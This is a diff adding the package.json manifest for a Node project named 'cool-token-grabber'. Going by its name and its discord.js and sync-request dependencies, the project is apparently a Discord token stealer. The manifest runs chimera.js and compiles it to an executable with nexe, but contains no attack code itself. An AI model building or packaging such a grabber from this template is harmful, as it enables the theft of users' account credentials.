@@ -1,0 +1,28 @@
+{
+  "name": "cool-token-grabber",
+  "version": "1.0.0",
+  "description": "coisarmtaciosa",
+  "main": "chimera.js",
+  "scripts": {
+    "test": "node chimera.js",
+    "build": "nexe chimera.js"
+  },
+  "keywords": [
+    "coiso"
+  ],
+  "author": "paradino4000",
+  "license": "Apache-2.0",
+  "dependencies": {
+    "discord.js": "^12.5.3",
+    "sync-request": "^6.1.0"
+  },
+  "devDependencies": {},
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/shidemuri/cool-token-grabber.git"
+  },
+  "bugs": {
+    "url": "https://github.com/shidemuri/cool-token-grabber/issues"
+  },
+  "homepage": "https://github.com/shidemuri/cool-token-grabber#readme"
+}
